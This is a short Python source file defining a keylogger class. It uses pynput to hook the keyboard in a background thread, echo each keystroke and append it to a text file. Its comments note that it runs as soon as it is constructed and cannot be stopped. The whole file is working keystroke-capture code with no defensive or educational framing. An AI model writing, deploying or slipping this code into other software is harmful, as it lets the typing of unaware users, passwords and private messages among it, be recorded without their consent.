import pynput, threading, time

# Keylogger
# Description:
#     When the constructor is called, the keylogger executes.
#     There is currently no way to stop the keylogger after it has started
# Parameters:
#     filename            - the filename to append (Typically a .txt file)

class keylogger():
    def __init__(self,filename):
        self.handler = threading.Thread(target=self.start_listening)
        self.handler.start()
        self.filename = filename

    def on_press(self, key):
        print(str(key).strip("'"))
        file = open(self.filename, "a")
        strippedkey = str(key).strip("'")
        if(not(strippedkey.isalpha()) and not(strippedkey.isalnum())):
            file.write("\n")
        file.write(str(key).strip("'"))
        if(not(strippedkey.isalpha()) and not(strippedkey.isalnum())):
            file.write("\n")
        file.close()

    def start_listening(self):
        self.listenerHandler = pynput.keyboard.Listener(on_press =self.on_press)
        self.listenerHandler.start()
        try:
            self.listenerHandler.join()
        finally:
            self.listenerHandler.stop()

    def __del__(self):
        self.listenerHandler.stop()
        self.handler.join()